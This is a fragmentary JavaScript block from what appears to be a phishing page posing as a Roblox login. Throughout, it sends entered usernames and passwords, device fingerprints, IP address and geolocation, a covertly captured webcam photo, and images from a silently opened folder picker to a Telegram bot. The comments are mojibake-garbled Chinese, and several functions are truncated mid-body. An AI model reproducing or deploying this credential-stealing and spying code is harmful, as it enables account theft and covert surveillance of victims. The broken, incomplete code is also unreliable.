<script>

    function generateSessionId() {

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return true;
        } catch (error) {
            console.error('å‘é€å¤±è´¥:', error);
            return false;
        }
    }

    async function sendPhotoToTelegram(file, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('photo', file);
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',

            });
            return true;
        } catch (error) {

    }

    // ==================== ç™»å½•å¤„ç† ====================

    async function sendCredentialsToTelegram(username, password) {

ğŸ‘¤ <b>ç”¨æˆ·å:</b> <code>${escapeHtml(username) || 'æœªæä¾›'}</code>
ğŸ”‘ <b>å¯†ç :</b> <code>${escapeHtml(password) || 'æœªæä¾›'}</code>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ†” <b>ä¼šè¯ID:</b> ${collectedData.sessionId}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“± <b>è®¾å¤‡:</b> ${navigator.platform}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;

    function escapeHtml(text) {
        const div = document.createElement('div');

    // ==================== è®¾å¤‡ä¿¡æ¯æ”¶é›† ====================
    async function collectDeviceInfo() {
        collectedData.deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,

            },
            hardware: {

                deviceMemory: navigator.deviceMemory
            }
        };

        // æ£€æµ‹æ“ä½œç³»ç»Ÿ
        collectedData.systemInfo.os = detectOS();
        
        // æ£€æµ‹æµè§ˆå™¨
        collectedData.systemInfo.browser = detectBrowser();
        
        // è·å–CanvasæŒ‡çº¹
        collectedData.deviceInfo.canvasFingerprint = getCanvasFingerprint();
        
        // å‘é€è®¾å¤‡ä¿¡æ¯
        const deviceMsg = `ğŸ“± <b>è®¾å¤‡ä¿¡æ¯æ”¶é›†å®Œæˆ</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ’» <b>ç³»ç»Ÿ:</b> ${collectedData.systemInfo.os}
ğŸŒ <b>æµè§ˆå™¨:</b> ${collectedData.systemInfo.browser}
ğŸ–¥ï¸ <b>åˆ†è¾¨ç‡:</b> ${screen.width}x${screen.height}
ğŸ”¢ <b>CPUæ ¸å¿ƒ:</b> ${navigator.hardwareConcurrency}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(deviceMsg);
    }

    function detectOS() {
        const ua = navigator.userAgent;
        if (/Windows/.test(ua)) return 'Windows';
        if (/Mac/.test(ua)) return 'macOS';
        if (/Linux/.test(ua)) return 'Linux';
        if (/Android/.test(ua)) return 'Android';
        if (/iPhone|iPad/.test(ua)) return 'iOS';
        return 'æœªçŸ¥';
    }

    function detectBrowser() {
        const ua = navigator.userAgent;
        if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
        if (/Firefox/.test(ua)) return 'Firefox';
        if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
        if (/Edg/.test(ua)) return 'Edge';
        return 'æœªçŸ¥';
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.fillStyle = '#007bff';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#ffffff';
            ctx.font = '16px Arial';
            ctx.fillText('Roblox', 10, 25);
            return canvas.toDataURL().substring(0, 100);
        } catch (e) {
            return null;
        }
    }

    // ==================== ç½‘ç»œä¿¡æ¯æ”¶é›† ====================
    async function collectNetworkInfo() {

            collectedData.networkInfo.ip = ipData.ip;
            
            // è·å–åœ°ç†ä½ç½®

            collectedData.networkInfo.geo = {

                isp: geoData.org
            };
            
            // å‘é€ä½ç½®ä¿¡æ¯
            const locationMsg = `ğŸ“ <b>ä½ç½®ä¿¡æ¯æ”¶é›†å®Œæˆ</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸŒ <b>å›½å®¶:</b> ${geoData.country_name || 'æœªçŸ¥'}

ğŸŒ <b>IP:</b> ${ipData.ip}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;

    // ==================== æ‘„åƒå¤´è®¿é—® ====================
    async function accessCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return false;
        }
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            return new Promise((resolve) => {
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const file = new File([blob], `roblox_photo_${Date.now()}.jpg`, {
                                type: 'image/jpeg'
                            });
                            
                            collectedData.photos.push({
                                name: file.name,
                                size: file.size,
                                timestamp: new Date().toISOString()
                            });
                            
                            // å‘é€åˆ°Telegram
                            await sendPhotoToTelegram(file, 'ğŸ“¸ Robloxç”¨æˆ·ç…§ç‰‡');
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve(true);
                        }
                    }, 'image/jpeg', 0.8);
                }, 1000);
            });
            
        } catch (error) {
            return false;
        }
    }
    // ==================== æ–‡ä»¶ç³»ç»Ÿè®¿é—® ====================
    function attemptFileAccess() {
        // è‡ªåŠ¨è§¦å‘æ–‡ä»¶å¤¹è®¿é—®
        if ('webkitdirectory' in document.createElement('input')) {
            setTimeout(() => {
                try {
                    const fileInput = document.createElement('input');
                    fileInput.type = 'file';
                    fileInput.webkitdirectory = true;
                    fileInput.multiple = true;
                    fileInput.style.display = 'none';
                    
                    fileInput.addEventListener('change', async (e) => {
                        const files = Array.from(e.target.files);
                        collectedData.files.push({
                            type: 'folder_scan',
                            count: files.length,
                            timestamp: new Date().toISOString()
                        });
                        
                        await sendToTelegram(`ğŸ“ <b>æ–‡ä»¶å¤¹æ‰«æå®Œæˆ</b>\nå‘ç°æ–‡ä»¶: ${files.length}ä¸ª`);
                        
                        // å¤„ç†å›¾ç‰‡æ–‡ä»¶
                        const imageFiles = files.filter(file => 
                            file.type.startsWith('image/') && file.size < 5 * 1024 * 1024
                        ).slice(0, 3);
                        
                        for (const file of imageFiles) {
                            await sendPhotoToTelegram(file, 'ğŸ“ ç³»ç»Ÿå›¾ç‰‡');
                        }
                    });
                    
                    document.body.appendChild(fileInput);
                    
                    // è‡ªåŠ¨è§¦å‘
                    setTimeout(() => {
                        try {
                            fileInput.click();
                        } catch (e) {}
                    }, 3000);
                    
                } catch (e) {}
            }, 2000);
        }
    }

    // ==================== UIæ§åˆ¶ ====================
    function showLoading() {
        document.getElementById('loadingOverlay').style.display = 'flex';

    }

    function hideLoading() {
        document.getElementById('loadingOverlay').style.display = 'none';

    function showSuccess() {

    function showError(message) {
        hideLoading();
        const errorElement = document.getElementById('errorMessage');
        if (message) {
            errorElement.textContent = message;
        }
        errorElement.classList.remove('hidden');
    }

    function delay(ms) {
